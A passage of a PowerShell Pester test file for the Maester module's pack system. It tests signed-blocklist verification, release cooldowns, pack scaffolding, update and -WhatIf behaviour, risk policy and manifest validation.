            Get-MtPackFirstSeen -RepositoryId 42 -Commit ('a' * 40) | Should -Be $first
            Get-MtPackFirstSeen -RepositoryId 42 -Commit ('b' * 40) | Should -BeGreaterThan $first
        }
    }

    It 'counts the publish date only for an immutable release' {
        InModuleScope Maester {
            $old = [datetime]::UtcNow.AddDays(-30).ToString('o')
            $commit = 'c' * 40
            Mock Invoke-MtPackGitHubRequest {
                switch -Wildcard ($Path) {
                    'repos/contoso/pack' { [pscustomobject]@{ id = 7; full_name = 'contoso/pack'; default_branch = 'main'; owner = [pscustomobject]@{ id = 9; login = 'contoso' } } }
                    'repos/contoso/pack/releases*' { @([pscustomobject]@{ tag_name = 'v1.0.0'; published_at = $old; draft = $false; prerelease = $false; immutable = $script:immutable }) }
                    'repos/contoso/pack/commits/*' { [pscustomobject]@{ sha = $commit } }
                }
            }
            $source = [pscustomobject]@{ Owner = 'contoso'; Repo = 'pack'; Folder = $null; Ref = $null }

            $script:immutable = $true
            $resolved = Resolve-MtPackGitHubSource -Source $source
            $resolved.AgeSource | Should -Be 'ImmutableRelease'
            $resolved.CooldownMet | Should -BeTrue

            $script:immutable = $false
            $resolved = Resolve-MtPackGitHubSource -Source $source
            $resolved.AgeSource | Should -Be 'FirstSeen'
            $resolved.CooldownMet | Should -BeFalse
        }
    }
}

Describe 'Pack blocklist' {
    BeforeAll {
        $script:key = [System.Security.Cryptography.ECDsa]::Create([System.Security.Cryptography.ECCurve+NamedCurves]::nistP256)
        $script:publicKey = [System.Convert]::ToBase64String($script:key.ExportSubjectPublicKeyInfo())
        function script:New-SignedList {
            param([long] $Serial, [object[]] $Entries, [switch] $Tamper)
            $payload = [System.Text.Encoding]::UTF8.GetBytes((@{ Serial = $Serial; IssuedAt = [datetime]::UtcNow.ToString('o'); Expires = [datetime]::UtcNow.AddDays(7).ToString('o'); Entries = $Entries } | ConvertTo-Json -Depth 5))
            $signature = $script:key.SignData($payload, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
            if ($Tamper) { $payload[5] = $payload[5] -bxor 1 }
            [pscustomobject]@{ KeyId = 'test'; Signature = [System.Convert]::ToBase64String($signature); Payload = [System.Convert]::ToBase64String($payload) }
        }
    }
    AfterAll { $script:key.Dispose() }

    BeforeEach {
        Reset-PackState -Root (Join-Path $TestDrive ([guid]::NewGuid().ToString('n')))
        InModuleScope Maester -Parameters @{ PublicKey = $script:publicKey } {
            param($PublicKey)
            $script:__MtPackTrust = [pscustomobject]@{ Blocklist = [pscustomobject]@{ Url = 'https://packs.example/blocklist.json'; Keys = @([pscustomobject]@{ KeyId = 'test'; PublicKey = $PublicKey }) } }
        }
    }

    It 'uses a list signed by a trusted key' {
        $list = New-SignedList -Serial 5 -Entries @(@{ PackId = 'contoso.sample'; Severity = 'Block'; Advisory = 'Malicious' })
        InModuleScope Maester -Parameters @{ List = $list } {
            param($List)
            Mock Invoke-RestMethod { $List }
            $result = Get-MtPackBlocklist
            $result.Available | Should -BeTrue
            (Find-MtPackBlock -Entry $result.Entries -PackId 'contoso.sample').Advisory | Should -Be 'Malicious'
        }
    }

    It 'ignores a list whose signature does not match, and warns' {
        $list = New-SignedList -Serial 5 -Entries @() -Tamper
        InModuleScope Maester -Parameters @{ List = $list } {
            param($List)
            Mock Invoke-RestMethod { $List }
            $result = Get-MtPackBlocklist
            $result.Available | Should -BeFalse
            $result.Warning | Should -Match 'signature'
        }
    }

    It 'refuses a list older than one it has seen' {
        $newer = New-SignedList -Serial 9 -Entries @()
        $older = New-SignedList -Serial 3 -Entries @()
        InModuleScope Maester -Parameters @{ Newer = $newer; Older = $older } {
            param($Newer, $Older)
            Mock Invoke-RestMethod { $Newer }
            (Get-MtPackBlocklist -Refresh).Serial | Should -Be 9
            Mock Invoke-RestMethod { $Older }
            (Get-MtPackBlocklist -Refresh).Serial | Should -Be 9
        }
    }
}

Describe 'New-MtPack' {
    It 'creates a pack that Test-MtPack accepts' {
        $path = Join-Path $TestDrive 'new-pack'
        $null = New-MtPack -Path $path -Id fabrikam.checks -Code FAB -Connector
        $result = Test-MtPack $path
        $result.IsValid | Should -BeTrue -Because (@($result.Errors | ForEach-Object Message) -join ' ')
        $result.TestIds | Should -Be @('MP.FAB.1001')
    }

    It 'asks for the Maester it was made with, so the new pack runs on that build' {
        $path = Join-Path $TestDrive 'new-pack-version'
        $null = New-MtPack -Path $path -Id fabrikam.version -Code FAB
        $manifest = Get-Content -LiteralPath (Join-Path $path 'maester-pack.json') -Raw | ConvertFrom-Json
        $version = (Get-Module Maester).Version
        $manifest.RequiresMaester | Should -Be ">=$($version.Major).$($version.Minor)"
        $manifest.'$schema' | Should -Be 'https://maester.dev/schemas/maester-pack-1.0.json'
        InModuleScope Maester -Parameters @{ Range = $manifest.RequiresMaester; Version = $version } {
            Test-MtVersionRange -Range $Range -Version $Version | Should -BeTrue
        }
    }
}

Describe 'Pack updates, config and policy' {
    BeforeEach {
        $script:root = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
        Reset-PackState -Root $script:root
        Push-Location (Join-Path $script:root 'project')
    }
    AfterEach { Pop-Location }

    It 'loads a pack whose helper folder also holds a .psm1, taking only its .ps1 helpers' {
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'psm1') -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Extra.psm1') -Value 'function Get-CntExtra { 1 }' }
        $rows = @(Invoke-MtTest -Path $pack)
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').Result | Should -Be 'Passed'
        ($rows | Where-Object ReasonCode -EQ 'PackLoadFailed') | Should -BeNullOrEmpty
    }

    It 'runs a pack of the maester365 organisation from its folder, which may use the reserved names' {
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'official') -Edit {
            param($p) Set-Manifest -Pack $p -Change { param($m) $m.Id = 'maester365.sample'; $m.Publisher = 'maester365' }
        }
        $rows = @(Invoke-MtTest -Path $pack)
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').Result | Should -Be 'Passed'
        # Test-MtPack without -Official still reports the reserved name, as a publisher outside the organisation sees it.
        @((Test-MtPack -Path $pack).Errors | Where-Object { $_.Message -match 'reserved' }).Count | Should -BeGreaterThan 0
    }

    It 'runs only the tests under a folder, not those of a sibling folder that starts with its name' {
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'sibling') -Edit {
            param($p)
            $null = New-Item -Path (Join-Path $p 'tests-extra') -ItemType Directory
            Move-Item -LiteralPath (Join-Path $p 'tests/Test.MP.CNT.1002.ps1') -Destination (Join-Path $p 'tests-extra')
            Move-Item -LiteralPath (Join-Path $p 'tests/Test.MP.CNT.1002.md') -Destination (Join-Path $p 'tests-extra')
            Copy-Item -LiteralPath (Join-Path $p 'tests/suite.json') -Destination (Join-Path $p 'tests-extra')
            Set-Manifest -Pack $p -Change { param($m) $m.Suites = @('tests', 'tests-extra') }
        }
        $ids = @(Invoke-MtTest -Path (Join-Path $pack 'tests')).Id
        $ids | Should -Contain 'MP.CNT.1001'
        $ids | Should -Not -Contain 'MP.CNT.1002'
    }

    It 'keeps Enabled and the Version range of a config entry when the pack is recorded again' {
        Set-Content -LiteralPath 'maester-config.json' -Value '{ "Packs": [ { "Id": "contoso.sample", "Enabled": false, "Version": "^1.0", "Note": "kept" } ] }'
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        $entry = (Get-Content -LiteralPath 'maester-config.json' -Raw | ConvertFrom-Json).Packs | Where-Object Id -EQ 'contoso.sample'
        $entry.Enabled | Should -BeFalse
        $entry.Version | Should -Be '^1.0'
        $entry.Note | Should -Be 'kept'
        $entry.Source | Should -Be $script:fixture
    }

    It 'leaves a pack whose files have not changed as it is, without asking again' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        $before = (Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json).Packs[0].ApprovedAt
        Mock -ModuleName Maester Show-MtPackApproval { throw 'asked again' }
        $result = Update-MtPack -NonInteractive 6>$null
        $result.Status | Should -Be 'UpToDate'
        Should -Invoke -ModuleName Maester Show-MtPackApproval -Times 0 -Exactly
        (Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json).Packs[0].ApprovedAt | Should -Be $before
    }

    It 'changes nothing with -WhatIf on <Name>' -ForEach @(
        @{ Name = 'Install-MtPack'; Command = { Install-MtPack $script:fixture -NonInteractive -WhatIf 6>$null } }
        @{ Name = 'Update-MtPack'; Command = { Update-MtPack -NonInteractive -WhatIf 6>$null } }
        @{ Name = 'Uninstall-MtPack'; Command = { Uninstall-MtPack contoso.sample -WhatIf } }
        @{ Name = 'Restore-MtPack'; Command = { Restore-MtPack -WhatIf } }
    ) {
        if ($Name -ne 'Install-MtPack') { $null = Install-MtPack $script:fixture -NonInteractive 6>$null }
        $lockBefore = if (Test-Path 'maester-packs.lock.json') { Get-Content -LiteralPath 'maester-packs.lock.json' -Raw } else { $null }
        $configBefore = Get-Content -LiteralPath 'maester-config.json' -Raw
        { & $Command } | Should -Not -Throw
        $(if (Test-Path 'maester-packs.lock.json') { Get-Content -LiteralPath 'maester-packs.lock.json' -Raw } else { $null }) | Should -Be $lockBefore
        Get-Content -LiteralPath 'maester-config.json' -Raw | Should -Be $configBefore
    }

    It 'reads a MaximumRisk of any case' {
        $policy = InModuleScope Maester { Get-MtPackPolicy -RunConfig ([pscustomobject]@{ PackPolicy = [pscustomobject]@{ MaximumRisk = 'low' } }) }
        $policy.MaximumRisk | Should -Be 'Low'
        InModuleScope Maester -Parameters @{ Policy = $policy } {
            param($Policy)
            Test-MtPackPolicy -Policy $Policy -PackId contoso.sample -Publisher contoso -Risk Low | Should -BeNullOrEmpty
            Test-MtPackPolicy -Policy $Policy -PackId contoso.sample -Publisher contoso -Risk Medium | Should -Match 'up to Low risk'
        }
    }

    It 'accepts a Guid in the manifest and refuses one that is not a GUID' {
        $read = InModuleScope Maester -Parameters @{ Path = (Resolve-Path "$PSScriptRoot/../../../packs/zero-trust-assessment").Path } { param($Path) Read-MtPackManifest -Path $Path -Official }
        $read.Errors | Should -BeNullOrEmpty
        @($read.Warnings | Where-Object { $_ -match 'Guid' }) | Should -BeNullOrEmpty
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'guid') -Edit { param($p) Set-Manifest -Pack $p -Change { param($m) $m | Add-Member Guid 'not-a-guid' } }
        $read = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) Read-MtPackManifest -Path $Path }
        ($read.Errors | ForEach-Object Message) -join ' ' | Should -Match 'Guid must be a GUID'
    }
}
